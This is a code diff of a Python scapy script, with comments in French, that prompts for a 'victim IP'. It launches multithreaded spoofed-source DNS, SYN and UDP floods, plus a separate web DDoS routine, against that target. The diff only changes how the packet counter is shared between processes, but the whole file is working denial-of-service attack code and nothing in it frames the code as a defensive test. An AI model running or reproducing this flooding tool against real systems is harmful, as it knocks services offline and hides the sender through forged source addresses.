@@ -1,21 +1,17 @@
 import time
 import random
 import threading
-from multiprocessing import Process, Value
-from scapy.all import IP, TCP, UDP, ICMP, DNS, send, DNSQR, Raw
-from queue import Queue
+from multiprocessing import Process, Manager
+from scapy.all import IP, TCP, UDP, ICMP, DNS, send, DNSQR
 from web_ddos import launch_web_ddos
 
 attack_threads = []
-packets_per_second = Value('i',0)
 start_time = 0
 
-def generate_traffic(destination_ip, destination_port, packet_count):
-    global packets_per_second
+def generate_traffic(destination_ip, destination_port, packet_count, packets_per_second):
     while True:
         protocols = ["TCP", "UDP", "ICMP"]
         print("Generation de traffic normal...")
-        print("nombre de paquets par seconde : ", packets_per_second.value)
         for _ in range(packet_count):
             src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
             src_port = random.randint(1024, 65535)
@@ -34,13 +30,11 @@ def generate_traffic(destination_ip, destination_port, packet_count):
             time.sleep(0.001)
         time.sleep(3)
 
-def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack_duration):
-    global attack_threads, start_time
-    start_time = time.time()
+def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack_duration, packets_per_second, lock):
+    global attack_threads
     attack_end_time = time.time() + attack_duration
 
     def dns_attack():
-        global packets_per_second
         while time.time() < attack_end_time:
             for _ in range(packet_count):
                 src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
@@ -49,11 +43,10 @@ def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack
                 packet = IP(src=src_ip, dst=destination_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name))
                 send(packet, verbose=0)
 
-                with packets_per_second.get_lock():
+                with lock:
                     packets_per_second.value += 1
 
     def syn_flood_attack():
-        global packets_per_second
         while time.time() < attack_end_time:
             for _ in range(packet_count):
                 src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
@@ -62,12 +55,11 @@ def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack
                 packet = IP(src=src_ip, dst=destination_ip) / TCP(sport=src_port, dport=destination_port, flags="S")
                 send(packet, verbose=0)
 
-                with packets_per_second.get_lock():
+                with lock:
                     packets_per_second.value += 1
 
 
     def udp_lag_attack():
-        global packets_per_second
         while time.time() < attack_end_time:
             for _ in range(packet_count):
                 src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
@@ -76,7 +68,7 @@ def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack
                 packet = IP(src=src_ip, dst=destination_ip) / UDP(sport=src_port, dport=destination_port)
                 send(packet, verbose=0)
 
-                with packets_per_second.get_lock():
+                with lock:
                     packets_per_second.value += 1
 
     
@@ -90,13 +82,15 @@ def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack
     for thread in attack_threads:
         thread.start()
     
-    launch_web_ddos(f"http://{destination_ip}")
+    launch_web_ddos(f"http://{destination_ip}", packets_per_second, lock)
 
-def print_statistics():
-    global packets_per_second, start_time
+def print_statistics(packets_per_second, lock):
+    global start_time
     elapsed_time = time.time() - start_time
     start_time = time.time()
     print(f"Paquets par seconde: {packets_per_second.value / elapsed_time:.2f}")
+    with lock:
+        packets_per_second.value = 0
 
 if __name__ == "__main__":
     destination_ip = input("Enter victim IP: ")
@@ -106,26 +100,29 @@ if __name__ == "__main__":
     normal_traffic_count = 30
     traffic_type = input("Enter 'normal' to launch normal traffic or 'attack' to launch attack traffic: ")
     normal_process, ddos_process = None, None
-    if traffic_type.lower() == 'normal':
-        print("\nSimulating normal traffic...")
-        normal_process = Process(target=generate_traffic, args=(destination_ip, destination_port, normal_traffic_count,))
-        normal_process.start()
-    elif traffic_type.lower() == 'attack':
-        print("\nSimulating attack traffic...")
-        ddos_process = Process(target=generate_ddos_traffic, args=(destination_ip, destination_port, ddos_traffic_count, attack_duration,))
-        ddos_process.start()
-    else:
-        print("Invalid input. Please enter 'normal' or 'attack'.")
-        exit(1)
-
-    try:
-        while True:
-            time.sleep(1)
-            print_statistics()
-    except KeyboardInterrupt:
-        print("Terminating processes...")
-        if normal_process is not None:
-            normal_process.terminate()
-        if ddos_process is not None:
-            ddos_process.terminate()
+    with Manager() as manager:
+        packets_per_second = manager.Value('i', 0)
+        lock = manager.Lock()
+        if traffic_type.lower() == 'normal':
+            print("\nSimulating normal traffic...")
+            normal_process = Process(target=generate_traffic, args=(destination_ip, destination_port, normal_traffic_count, packets_per_second,))
+            normal_process.start()
+        elif traffic_type.lower() == 'attack':
+            print("\nSimulating attack traffic...")
+            ddos_process = Process(target=generate_ddos_traffic, args=(destination_ip, destination_port, ddos_traffic_count, attack_duration, packets_per_second, lock,))
+            ddos_process.start()
+        else:
+            print("Invalid input. Please enter 'normal' or 'attack'.")
+            exit(1)
+        start_time = time.time()
+        try:
+            while True:
+                time.sleep(1)
+                print_statistics(packets_per_second, lock)
+        except KeyboardInterrupt:
+            print("Terminating processes...")
+            if normal_process is not None:
+                normal_process.terminate()
+            if ddos_process is not None:
+                ddos_process.terminate()
     print("End.")
